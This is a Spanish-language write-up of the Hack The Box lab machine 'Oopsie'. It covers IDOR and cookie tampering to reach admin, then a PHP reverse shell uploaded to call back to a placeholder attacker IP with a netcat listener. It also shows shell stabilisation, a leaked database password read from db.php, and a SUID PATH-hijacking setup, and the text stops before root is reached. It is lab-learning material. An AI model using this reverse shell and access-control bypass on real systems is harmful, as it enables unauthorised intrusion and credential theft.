# Oopsie-WriteUp
Oopsie is a very easy Linux machine that highlights the impact of information disclosure and broken access control in web applications. Website enumeration reveals a guest login with manipulatable cookies and user IDs allowing escalation to an admin role and access to a file upload feature.

## 🕵️‍♂️ Paso 1: Reconocimiento y Enumeración de Red

El ciclo de vida de la auditoría comienza mapeando la superficie de ataque expuesta mediante un escaneo exhaustivo de puertos utilizando la herramienta `nmap`.

```nmap -sC -sV -p- --min-rate 5000 10.10.10.28 -oN nmap_report.txt```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Puerto 22 (SSH): Versión OpenSSH 7.6p1. No se identifican exploits públicos de ejecución remota de comandos (RCE) aplicables directamente, por lo que se descarta de forma inicial a falta de credenciales.

Puerto 80 (HTTP): Servidor Apache 2.4.29. Indica la presencia de una aplicación web activa. Este será nuestro vector de entrada principal.

## Paso 2: Enumeración y Explotación Web

Navegamos a la dirección IP del objetivo (http://10.10.10.28) empleando un navegador. Se visualiza el sitio corporativo de "MegaCorp Auto".

1. Descubrimiento e Information Disclosure

Inspeccionando los menús de la aplicación web, encontramos un botón para interactuar con la plataforma en modo invitado: Login as Guest. Al hacer clic, la aplicación web nos redirige a una ruta interna dinámica:
[http://10.10.10.28/cdn-cgi/login/admin.php?id=2](http://10.10.10.28/cdn-cgi/login/admin.php?id=2)

Si abrimos las herramientas de desarrollador en el navegador (F12 -> Almacenamiento -> Cookies), observamos que el servidor web asigna dos parámetros estáticos en el cliente para el control de la sesión:

    role = guest

    user = 34322

2. Escalada de Privilegios mediante IDOR

Dado que el parámetro id expuesto en la URL es secuencial (?id=2), probamos un ataque de referencia directa insegura a objetos (IDOR). Cambiamos el identificador a 1 en la barra de direcciones:
[http://10.10.10.28/cdn-cgi/login/admin.php?id=1](http://10.10.10.28/cdn-cgi/login/admin.php?id=1)
<img width="1750" height="930" alt="image" src="https://github.com/user-attachments/assets/b33fa654-83fc-41d2-bbac-7127bb8979d0" />

3. Secuestro de Sesión (Session Hijacking)

Para escalar nuestros privilegios de forma vertical dentro de la aplicación, interceptamos y modificamos nuestras cookies locales en el navegador, sustituyendo los valores de nuestro perfil de invitado por los recolectados del administrador:

    Cambiamos el valor de la cookie role de guest a admin.

    Cambiamos el valor de la cookie user de 34322 a 34232.

Refrescamos la página web. El backend procesa los nuevos valores y nos reconoce como el usuario admin legítimo, desbloqueando un nuevo menú restringido en la barra superior llamado Upload.

## 🔓 Paso 3: Acceso Inicial (File Upload & RCE)

El menú Upload nos permite cargar archivos al servidor. Como la aplicación no valida en el backend el contenido real del archivo, las firmas (Magic Numbers) ni bloquea las extensiones de scripts ejecutables, podemos subir código malicioso para forzar una ejecución remota de comandos (RCE).
1. Preparación de la Payload (PHP Reverse Shell)

Utilizamos un script estándar de conexión inversa en PHP (como el de Pentestmonkey), modificando los sockets de red para que apunten a nuestra dirección IP de la interfaz de Hack The Box y al puerto donde nos mantendremos a la escucha:
<?php
// PHP Reverse Shell para entornos Linux
// Diseñado para establecer una conexión de red hacia el atacante.
$ip = '10.10.14.XX';  // CAMBIAR POR TU IP DE LA VPN DE HTB
$port = 4444;         // Puerto de escucha local
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

<img width="1750" height="930" alt="image" src="https://github.com/user-attachments/assets/67306fd7-caad-40d7-bc5d-2f52abd141b6" />

2. Captura de la Shell

A través de la inspección del código fuente o la enumeración de directorios comunes, determinamos que las cargas se almacenan en el subdirectorio público /uploads/.

Antes de activar el script, abrimos un puerto de escucha en nuestra terminal local usando Netcat:
nc -lvnp 4444

## 🔄 Paso 4: Tratamiento de la TTY y Movimiento Lateral

La shell obtenida originalmente a través del servidor web no posee capacidades interactivas avanzadas (no podemos autocompletar con Tab, usar las flechas del teclado, ni ejecutar comandos que requieran prompts de contraseña como su).
1. Estabilización de la Terminal (TTY Spoofing)

Ejecutamos la siguiente secuencia de comandos dentro de la shell recibida para estabilizarla por completo:La shell obtenida originalmente a través del servidor web no posee capacidades interactivas avanzadas (no podemos autocompletar con Tab, usar las flechas del teclado, ni ejecutar comandos que requieran prompts de contraseña como su).

# Paso 1: Forzar la creación de un pseudo-terminal (PTY) usando Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Paso 2: Suspender la shell actual enviándola a segundo plano
# Presionamos la combinación de teclas: CTRL + Z

# Paso 3: Configurar nuestra terminal local en modo 'raw' para retransmitir comandos directamente
stty raw -echo; fg

# Paso 4: Resetear y reconfigurar las variables de entorno de la terminal
reset xterm
export TERM=xterm
export SHELL=bash

2. Enumeración Interna y Reutilización de Credenciales

Con una terminal completamente estable, auditamos el directorio raíz de la aplicación web (/var/www/html) en busca de credenciales codificadas o archivos de configuración de bases de datos. Inspeccionamos un script de autenticación oculto dentro del directorio restringido:

cat /var/www/html/cdn-cgi/login/db.php
<?php
$conn = mysqli_connect("localhost", "robert", "M3g4C0rpM4n4g3m3nt!", "garage");
?>

## Paso 5: Escalada Local de Privilegios (Root)
Para comprometer la máquina en su totalidad, analizamos los vectores de elevación de privilegios locales. Buscamos archivos ejecutables que tengan configurado el bit SUID (Set User ID).

find / -perm -4000 -type f 2>/dev/null
Análisis de Binarios SUID:

Entre las utilidades comunes del sistema operativo, destaca un binario personalizado inusual:
/usr/bin/bugtracker

Al interactuar con el ejecutable /usr/bin/bugtracker, observamos que solicita de forma dinámica un número de identificación de reporte. Al proveérselo, el programa hace una llamada interna al comando estándar de Linux cat para leer un archivo de bitácora almacenado en una ruta privilegiada (aproximadamente cat /root/reports/[ID]).
El Fallo de Diseño: Llamadas Relativas

El binario está llamando a cat utilizando su nombre relativo (cat) en lugar de invocarlo mediante su ruta absoluta e inmutable (/bin/cat). Debido a esto, el sistema operativo confiará ciegamente en el orden de los directorios especificados en la variable de entorno $PATH del usuario actual para encontrar el comando.
Explotación mediante PATH Hijacking:

Aprovechando este comportamiento, inyectaremos un ejecutable fraudulento bajo el nombre de cat dentro de una ubicación del sistema donde poseamos permisos de escritura completos (como /tmp), alterando el orden de búsqueda del $PATH.
<img width="1750" height="930" alt="image" src="https://github.com/user-attachments/assets/fb353789-5a0d-41b4-a1b7-de5f0a69d1af" />




